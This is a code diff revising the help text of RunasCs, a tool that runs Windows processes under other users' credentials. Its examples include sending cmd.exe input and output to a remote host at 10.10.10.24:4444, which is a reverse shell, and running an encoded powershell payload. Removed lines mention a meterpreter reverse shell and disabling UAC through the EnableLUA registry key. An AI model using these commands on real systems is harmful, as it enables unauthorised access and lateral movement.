@@ -1224,31 +1224,17 @@ public static class Token{
 public static class RunasCsMainClass
 {
     private static string help = @"
-
 RunasCs v1.2 - @splinter_code
 
-RunasCs is an utility to run specific processes with different permissions than the user's current logon provides
-using explicit credentials.
-RunasCs has an automatic detection to determine the best create process function for every contexts.
-Based on the caller token permissions, it will use one of the create process function in the following preferred order:
-    1. CreateProcessAsUser();
-    2. CreateProcessWithTokenW();
-    3. CreateProcessWithLogonW().
-The two processes (calling and called) will communicate through 1 pipe (both for stdout and stderr).
-The default logon type is 3 (Network_Logon).
-If you set Interactive (2) logon type you will face some UAC restriction problems.
-You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:
-
-    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
-
-By default, the calling process (RunasCs) will wait until the end of the execution of the spawned process and will use
-cmd.exe to manage stdout and stderr.
-If you need to spawn a background or async process, i.e. spawning a reverse shell, you need to set the parameter
-'process_timeout' to 0. In this case the process will be spawned without using cmd.exe and RunasCs won't
-wait for the end of the execution.
-
 Usage:
-    RunasCs.exe username password cmd [domain] [process_timeout] [logon_type] 
+    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t timeout]
+
+Description:
+    RunasCs is an utility to run specific processes under a different user account
+    by specifying explicit credentials. In contrast to the default runas.exe command
+    it supports different logon types and crateProcess functions to be used, depending
+    on your current permissions. Furthermore it allows input/output redirection (even
+    to remote hosts) and you can specify the password directly on the command line.
 
 Positional arguments:
     username                username of the user
@@ -1283,16 +1269,12 @@ Optional arguments:
 Examples:
     Run a command as a specific local user
         RunasCs.exe user1 password1 whoami
-    Run a command as a specific domain user
-        RunasCs.exe user1 password1 whoami -d domain
-    Run a command as a specific local user with interactive logon type (2)
-        RunasCs.exe user1 password1 whoami -l 2
+    Run a command as a specific domain user and interactive logon type (2)
+        RunasCs.exe user1 password1 whoami -d domain -l 2
     Run a background/async process as a specific local user,
-    i.e. meterpreter ps1 reverse shell
         RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc..."" -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
-        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc.."" -r 10.10.10.24:4444
-
+        RunasCs.exe ""user1"" ""password1"" ""cmd.exe"" -r 10.10.10.24:4444
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
